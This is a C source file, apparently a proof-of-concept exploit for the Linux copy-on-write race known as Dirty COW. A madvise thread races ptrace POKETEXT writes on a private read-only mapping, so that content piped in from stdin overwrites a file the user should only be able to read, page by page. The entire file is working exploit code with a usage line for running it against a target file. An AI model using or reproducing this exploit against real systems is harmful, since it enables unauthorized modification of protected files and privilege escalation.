/*
 * Multipage COW PoC
 */
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/prctl.h>

/* definitions are likely arch dependent */
#define WORDSIZE (sizeof(long))
#define REPEAT 100 /* 100 */ 
#define REPEAT_WORD 100 /* 100 */ 

typedef long * word_p;

void *map;
int pagesize;

void handle_sigusr(int signal) {
    /*printf("madvise done for!\n");*/
    exit(0);
}

void *madvise_race(void *arg)
{
    int mok = 0;
    int endbyte = *((int*)arg);
    // printf("strike @%d\n", endbyte);

    for (;;) {
        mok += madvise(map, endbyte, MADV_DONTNEED);
    }
    //printf("madvise errors? %s (%d)\n", (mok > 0) ? "Y" : "N", mok);
}

void resize(char **buffer, unsigned int *size, unsigned int newsize) {
    *size = newsize;
    *buffer = realloc(*buffer, sizeof(char) * *size);
    if (*buffer == NULL) {
        printf("buffer could not be resized\n");
        exit(1);
    }
}

void spawn_for_page(pid_t *pid, int endbyte)
{
    *pid = fork();
    pthread_t pth;
    struct sigaction sa;

    if (*pid) { /* parent */
        waitpid(*pid, NULL, 0);
        sleep(1);
    
    } else { /* child */

        /* die if parent dies */
        prctl(PR_SET_PDEATHSIG, SIGKILL);

        /* set up the signal handler */
        sa.sa_handler = &handle_sigusr;
        if (sigaction(SIGUSR1, &sa, NULL) < 0) {
            perror("Could not register a signal handler!");
        }

        pthread_create(&pth, NULL, madvise_race, &endbyte);
        ptrace(PTRACE_TRACEME);
        kill(getpid(), SIGSTOP);
        pthread_join(pth, NULL);
        exit(0);
    }
    

}

int main(int argc, char *argv[])
{

    int f;
    pid_t pid;
    struct stat st;

    if (argc < 2) {
        printf("too few arguments\n usage: ./mucow dest < payload\n");
        return 1;
    }

    /* constants */
    pagesize = getpagesize();

    /* read in the content */
    unsigned int size = 1;
    unsigned int n_read = 0;
    unsigned int n_pos = 0;
    char *buffer;

    buffer = malloc(size * sizeof(char));
    while ((n_read = read(STDIN_FILENO, buffer+n_pos, (size - n_pos))) > 0) {
        n_pos += n_read;
        /* ensure space */
        if (n_pos == size) resize(&buffer, &size, size*2); 
    }

    printf("read %d bytes from stdin\n", n_pos);

    /* ensure that the buffer is word alligned */
    int extra = WORDSIZE - (n_pos % WORDSIZE);
    resize(&buffer, &size, n_pos + extra);


    while (extra--) buffer[size - extra - 1] = '\0';

    f = open(argv[1], O_RDONLY);
    fstat(f, &st);

    /* open memory map, with padding */
    size_t mmapsize = st.st_size + (WORDSIZE - (st.st_size % WORDSIZE));
    map = mmap(NULL, 
               mmapsize, 
               PROT_READ, MAP_PRIVATE, f, 0);

    /* sanity checks */
    assert(size % WORDSIZE == 0);
    //assert(size < getpagesize());
    assert(size <= mmapsize);

    /* parent code */
    int i, j, k, ec;
    
    int L = n_pos;
    int page = 0;
    int next;

    for (i = 0; i < REPEAT; i++) { // copy in word-sized strides 
        printf("repitition: %d/%d\n", i, REPEAT);
        page = 0;
        for (j = 0; j < L; j += WORDSIZE) { // copy in word-sized strides 
            if (j/pagesize >= page) {
                page++;
                kill(pid, SIGUSR1);
                next = pagesize*page;
                next = next < mmapsize? next: mmapsize;
                spawn_for_page(&pid, next);
            }
            for (k = 0; k < REPEAT_WORD; k++) { // repeat for each word
                ec += ptrace(PTRACE_POKETEXT, pid, 
                             map + j, 
                             *((word_p) (buffer + j)));
            }
        }
    }
    kill(pid, SIGUSR1);
    printf("ptrace errors? %s (%d)\n", (ec > 0) ? "Y" : "N", ec);
    return 0;
}
